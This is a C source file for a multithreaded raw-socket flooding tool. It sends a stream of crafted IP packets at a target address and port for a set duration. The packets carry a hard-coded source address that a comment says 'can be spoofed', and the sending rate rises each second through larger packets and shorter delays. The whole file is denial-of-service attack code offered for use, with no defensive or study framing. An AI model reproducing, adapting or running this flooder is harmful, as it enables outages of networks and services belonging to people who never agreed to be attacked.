#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>

// Structure to pass arguments to threads
typedef struct {
    char *target_ip;
    int target_port;
    int packet_size;
    int delay_us; // Delay in microseconds
    int thread_id; // To identify threads for better control
    volatile sig_atomic_t *running; // For thread control
    int flood_duration; // Flood duration in seconds
} FloodArgs;

// Function to create a raw socket
int create_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        return -1;
    }
    return sock;
}

// Function to calculate the checksum
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) &oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short) ~sum;

    return answer;
}

// Global variable to control the flood
volatile sig_atomic_t global_running = 1;

// Signal handler to gracefully exit the flood
void sigint_handler(int signum) {
    global_running = 0;
    printf("\nFlood terminated. Cleaning up...\n");
}

// Function to build and send IP packets
void *flood_thread(void *arg) {
    FloodArgs *args = (FloodArgs *)arg;
    int sock = create_raw_socket();
    if (sock == -1) {
        fprintf(stderr, "Thread %d: Could not create socket. Exiting...\n", args->thread_id);
        pthread_exit(NULL);
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(args->target_port);
    sin.sin_addr.s_addr = inet_addr(args->target_ip);

    // Dynamic adjustment logic
    int current_packet_size = args->packet_size;
    int current_delay_us = args->delay_us;
    int time_elapsed = 0;

    char *packet = (char *)malloc(current_packet_size);
    if (!packet) {
        perror("malloc");
        close(sock);
        pthread_exit(NULL);
    }
    memset(packet, 0, current_packet_size);

    // Build IP header (minimal)
    struct iphdr *iph = (struct iphdr *)packet;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(current_packet_size);
    iph->id = htons(rand());
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_RAW;
    iph->check = 0; // Set to 0 to calculate checksum later
    iph->saddr = inet_addr("192.168.1.1"); // Source IP (can be spoofed)
    iph->daddr = inet_addr(args->target_ip);

    // Calculate IP checksum
    iph->check = checksum((unsigned short *)packet, iph->ihl * 4);

    printf("Thread %d started flooding...\n", args->thread_id);

    time_t start_time = time(NULL);

    while (*args->running) {
        if (sendto(sock, packet, current_packet_size, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            //perror("sendto"); // Reduced verbosity to avoid overwhelming the output
        }

        // Dynamically adjust packet size and delay
        if (time(NULL) - start_time > time_elapsed) {
            // Adjust packet size and delay after every second
            if (current_packet_size < 65535) {
                current_packet_size += 10; // Gradually increase packet size
            }
            if (current_delay_us > 100) {
                current_delay_us -= 100; // Gradually decrease delay to increase the rate of sending
            }

            // Print new parameters for debugging
            printf("Thread %d: Adjusting - Packet Size: %d, Delay: %dus\n", args->thread_id, current_packet_size, current_delay_us);

            // Update the time elapsed
            time_elapsed = time(NULL) - start_time;
        }

        usleep(current_delay_us); // Delay in microseconds
    }

    printf("Thread %d exiting...\n", args->thread_id);
    close(sock);
    free(packet);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    signal(SIGINT, sigint_handler); // Register signal handler for Ctrl+C

    // Changed from argc < 7 to argc < 6 to account for the new behavior
    if (argc < 5) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <num_threads> <flood_duration_seconds>\n", argv[0]);
        exit(1);
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    int flood_duration = atoi(argv[4]);

    // Automatically set packet_size and delay_us (no need for user input)
    int packet_size = 1024;  // Initial packet size in bytes
    int delay_us = 1000;     // Initial delay in microseconds (1 millisecond)

    // Packet size limit
    if (packet_size > 65535) {
        fprintf(stderr, "Packet size too large. Must be <= 65535\n");
        exit(1);
    }

    pthread_t threads[num_threads];
    FloodArgs args[num_threads];
    volatile sig_atomic_t thread_running[num_threads]; // Per-thread control flags

    // Seed the random number generator
    srand(time(NULL));

    // Initialize thread control flags
    for (int i = 0; i < num_threads; i++) {
        thread_running[i] = 1;
    }

    // Prepare arguments for threads
    for (int i = 0; i < num_threads; i++) {
        args[i].target_ip = target_ip;
        args[i].target_port = target_port;
        args[i].packet_size = packet_size;
        args[i].delay_us = delay_us;
        args[i].thread_id = i;
        args[i].running = &thread_running[i]; // Pass the per-thread flag
        args[i].flood_duration = flood_duration;
    }

    // Create threads
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, flood_thread, &args[i]) < 0) {
            perror("pthread_create");
            exit(1);
        }
    }

    // Wait for the specified flood duration
    sleep(flood_duration);
    printf("Flood duration reached. Terminating threads...\n");

    // Stop all threads by setting the global running flag to 0
    for (int i = 0; i < num_threads; i++) {
        thread_running[i] = 0;
    }

    // Wait for all threads to finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("All threads terminated. Exiting...\n");
    return 0;
}